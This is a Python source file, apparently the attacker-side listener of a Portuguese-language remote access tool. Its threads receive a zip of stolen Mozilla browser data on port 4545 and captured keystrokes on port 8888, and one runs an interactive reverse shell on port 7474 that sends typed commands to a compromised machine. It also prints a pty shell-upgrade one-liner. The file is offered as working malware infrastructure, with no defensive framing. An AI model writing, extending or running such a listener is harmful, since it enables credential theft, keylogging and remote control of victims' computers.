version = 'v2-dev'

import sys
import socket
import time as t
import threading as th

print("""python -c 'import pty; pty.spawn("/bin/bash")'\n""")

def Receber_mozilla():
    a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    a.bind(('', 4545))
    a.listen(1)
    print("Aguardando conexão para receber arquivos...")
    client_socket, client_address = a.accept()
    print(f"Conexão estabelecida com {client_address}")
    with open(f'{client_address[0]}.zip', 'wb') as file:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            file.write(data)
    print("Dados de Navegador recebidos com sucesso!\n")
    client_socket.close()
    a.close()

def Receber_teclas():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', 8888))
    s.listen(1)
    print(f'Esperando por conexões ...')
    while True:
        client_socket, client_address = s.accept()
        with open(f'./{client_address[0]}', 'wb') as file:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                file.write(data)
        client_socket.close()
    

def nc():
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    porta = 7474
    try:
        c.bind(('', porta))
        c.listen(1)
        print(f"Reverse Shell em espera ...")
        conn, addr = c.accept()
        print(f'Conexão recebida de {addr[0]}\n')
        while True:
            ans = conn.recv(1024).decode()
            sys.stdout.write(ans)
            command = input()
            command += "\n"
            conn.send(command.encode())
            t.sleep(0.1)
            sys.stdout.write("\033[A" + ans.split("\n")[-1])
    except OSError:
        pass
        #print('Esta PORTA está sendo utilizada.')
    except KeyboardInterrupt:
        pass

thread_receber_arquivo = th.Thread(target=Receber_mozilla)
thread_receber_conexao = th.Thread(target=Receber_teclas)
thread_rev = th.Thread(target=nc)

thread_receber_arquivo.start()
thread_receber_conexao.start()
thread_rev.start()

thread_receber_arquivo.join()
thread_receber_conexao.join()
thread_rev.join()
